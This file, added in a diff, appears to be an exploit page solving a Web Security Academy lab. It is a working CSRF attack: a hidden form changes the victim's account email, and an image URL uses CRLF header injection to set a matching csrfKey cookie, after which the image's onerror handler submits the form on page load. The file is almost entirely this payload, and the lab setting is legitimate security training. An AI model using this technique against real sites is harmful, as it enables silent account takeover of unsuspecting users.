@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+
+    <form method="POST" action="https://0a4f00c703b3bb9182f901cb0005008c.web-security-academy.net/my-account/change-email">
+        <!-- <input type="hidden" name="csrfKey" value="BzNQANDU7czGhy06AG47CTb689y8wLi8"> -->
+        <input type="hidden" name="csrf" value="7clkIAjMeqbhSdaLHrvk2KOHeISMn6jM">
+        
+        <input type="hidden" name="email" value="hahaha@fa.ca">
+    </form>
+
+    <img src="https://0a4f00c703b3bb9182f901cb0005008c.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=6QK052QEBbGVO1AvwAITXEVJ4z4edQSl%3b%20SameSite=None" onerror="document.forms[0].submit()">
+
+
+</body>
+</html>
